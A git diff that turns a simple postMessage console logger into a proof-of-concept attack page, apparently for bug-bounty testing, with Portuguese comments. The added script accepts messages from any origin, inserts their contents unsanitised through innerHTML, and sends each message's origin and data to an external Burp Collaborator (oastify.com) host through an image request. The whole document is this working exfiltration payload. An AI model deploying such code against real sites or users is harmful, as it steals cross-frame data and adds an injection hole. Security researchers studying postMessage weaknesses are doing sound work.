@@ -1,7 +1,41 @@
-<script>
-  window.addEventListener("message", (e) => {
-  console.log("📥 [iframe] Recebido de", e.origin);
-  console.log("📦 Dados:", JSON.stringify(e.data, null, 2));
-});
+<!DOCTYPE html>
+<html>
+<head>
+  <title>PoC: iframe postMessage logger</title>
+  <style>
+    body {
+      background: #111;
+      color: #0f0;
+      font-family: monospace;
+      padding: 20px;
+    }
+  </style>
+</head>
+<body>
+  <h1>📡 Aguardando mensagens...</h1>
+  <div id="log"></div>
 
-</script>
+  <script>
+    // Exfiltra via GET para o Collaborator
+    function exfiltrate(data) {
+      const encoded = encodeURIComponent(JSON.stringify(data));
+      const img = new Image();
+      img.src = `https://k2nxq1ustsd6o6gb79wwabzjcai16rug.oastify.com/?data=${encoded}`;
+    }
+
+    // Escuta mensagens recebidas
+    window.addEventListener("message", (e) => {
+      const log = document.getElementById("log");
+      const p = document.createElement("p");
+      p.innerHTML = `<strong>🛰️ Origem:</strong> ${e.origin}<br><strong>📦 Dados:</strong> ${JSON.stringify(e.data, null, 2)}`;
+      log.appendChild(p);
+
+      // Envia pro Collaborator
+      exfiltrate({
+        origin: e.origin,
+        data: e.data
+      });
+    });
+  </script>
+</body>
+</html>
